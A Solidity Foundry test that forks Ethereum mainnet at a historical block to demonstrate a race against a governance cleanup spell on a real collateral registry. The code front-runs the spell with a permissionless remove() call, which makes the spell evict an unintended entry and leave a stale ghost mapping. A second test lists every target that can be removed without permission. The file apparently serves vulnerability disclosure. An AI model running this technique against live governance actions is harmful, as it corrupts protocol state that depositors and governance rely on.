// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.16;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface RegistryRaceLike {
    function count() external view returns (uint256);
    function list() external view returns (bytes32[] memory);
    function get(uint256) external view returns (bytes32);
    function pos(bytes32) external view returns (uint256);
    function join(bytes32) external view returns (address);
    function remove(bytes32) external;
}

interface SpellRaceLike {
    function cast() external;
    function done() external view returns (bool);
}

contract IlkRegistryTargetScanTest is Test {
    uint256 internal constant PRE_CAST_BLOCK = 23_118_263;
    address internal constant REGISTRY = 0x5a464C28D19848f44199D003BeF5ecc87d090F87;
    address internal constant CLEANUP_SPELL = 0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5;

    RegistryRaceLike internal constant registry = RegistryRaceLike(REGISTRY);
    SpellRaceLike internal constant spell = SpellRaceLike(CLEANUP_SPELL);

    function _targets() internal pure returns (bytes32[] memory t) {
        t = new bytes32[](42);
        t[0] = "LSE-MKR-A";
        t[1] = "AAVE-A";
        t[2] = "BAL-A";
        t[3] = "BAT-A";
        t[4] = "COMP-A";
        t[5] = "CRVV1ETHSTETH-A";
        t[6] = "GNO-A";
        t[7] = "GUSD-A";
        t[8] = "KNC-A";
        t[9] = "LINK-A";
        t[10] = "LRC-A";
        t[11] = "MANA-A";
        t[12] = "MATIC-A";
        t[13] = "PAXUSD-A";
        t[14] = "RENBTC-A";
        t[15] = "RETH-A";
        t[16] = "RWA003-A";
        t[17] = "RWA006-A";
        t[18] = "RWA007-A";
        t[19] = "RWA008-A";
        t[20] = "RWA010-A";
        t[21] = "RWA011-A";
        t[22] = "RWA012-A";
        t[23] = "RWA013-A";
        t[24] = "RWA014-A";
        t[25] = "RWA015-A";
        t[26] = "TUSD-A";
        t[27] = "UNI-A";
        t[28] = "UNIV2AAVEETH-A";
        t[29] = "UNIV2DAIETH-A";
        t[30] = "UNIV2DAIUSDT-A";
        t[31] = "UNIV2ETHUSDT-A";
        t[32] = "UNIV2LINKETH-A";
        t[33] = "UNIV2UNIETH-A";
        t[34] = "UNIV2USDCETH-A";
        t[35] = "UNIV2WBTCDAI-A";
        t[36] = "UNIV2WBTCETH-A";
        t[37] = "USDC-A";
        t[38] = "USDC-B";
        t[39] = "USDT-A";
        t[40] = "YFI-A";
        t[41] = "ZRX-A";
    }

    function _contains(bytes32[] memory values, bytes32 needle) internal pure returns (bool) {
        for (uint256 i = 0; i < values.length; i++) {
            if (values[i] == needle) return true;
        }
        return false;
    }

    function testFindRealPermissionlessPreRemoveAndCorruptRealSpell() public {
        uint256 cleanFork = vm.createFork("mainnet", PRE_CAST_BLOCK);
        uint256 attackFork = vm.createFork("mainnet", PRE_CAST_BLOCK);

        vm.selectFork(cleanFork);
        uint256 initialCount = registry.count();
        spell.cast();
        assertTrue(spell.done(), "clean spell did not finish");
        bytes32[] memory cleanList = registry.list();
        uint256 cleanCount = registry.count();
        assertEq(initialCount, 72, "unexpected historical registry count");
        assertEq(cleanCount, initialCount - 42, "official clean baseline must remove exactly 42");

        vm.selectFork(attackFork);
        bytes32[] memory targets = _targets();
        bytes32 preRemoved;
        uint256 beforePreRemove = registry.count();

        for (uint256 i = 0; i < targets.length; i++) {
            (bool ok,) = REGISTRY.call(abi.encodeWithSignature("remove(bytes32)", targets[i]));
            if (ok) {
                preRemoved = targets[i];
                break;
            }
        }

        console2.log("pre-removable target:");
        console2.logBytes32(preRemoved);
        assertTrue(preRemoved != bytes32(0), "none of the 42 real targets was permissionless-removable");
        assertEq(registry.count(), beforePreRemove - 1, "pre-removal did not pop exactly once");
        assertEq(registry.join(preRemoved), address(0), "pre-removed target mapping was not cleared");

        spell.cast();
        assertTrue(spell.done(), "attacked spell did not finish");
        bytes32[] memory attackList = registry.list();
        uint256 attackCount = registry.count();

        console2.log("clean count", cleanCount);
        console2.log("attack count", attackCount);
        assertEq(attackCount, cleanCount - 1, "one pre-removal must create one extra eviction");

        bytes32 victim;
        for (uint256 i = 0; i < cleanList.length; i++) {
            if (!_contains(attackList, cleanList[i])) {
                victim = cleanList[i];
                break;
            }
        }

        console2.log("unintended victim:");
        console2.logBytes32(victim);
        assertTrue(victim != bytes32(0), "no clean-state survivor was lost in attacked state");
        assertFalse(_contains(targets, victim), "victim must be outside the voted removal set");

        address ghostJoin = registry.join(victim);
        uint256 stalePos = registry.pos(victim);
        console2.log("ghost join", ghostJoin);
        console2.log("stale pos", stalePos);

        assertTrue(ghostJoin != address(0), "victim mapping was not left as a ghost entry");
        assertTrue(stalePos >= registry.count() || registry.get(stalePos) != victim, "victim mapping unexpectedly remains consistent");
    }

    function testListEveryPermissionlessRemovableRealTarget() public {
        bytes32[] memory targets = _targets();
        uint256 removable;

        for (uint256 i = 0; i < targets.length; i++) {
            uint256 fork = vm.createFork("mainnet", PRE_CAST_BLOCK);
            vm.selectFork(fork);
            (bool ok,) = REGISTRY.call(abi.encodeWithSignature("remove(bytes32)", targets[i]));
            if (ok) {
                removable++;
                console2.log("permissionless-removable:");
                console2.logBytes32(targets[i]);
            }
        }

        console2.log("total permissionless-removable targets", removable);
        assertGt(removable, 0, "historical spell had no permissionless-removable target");
    }
}
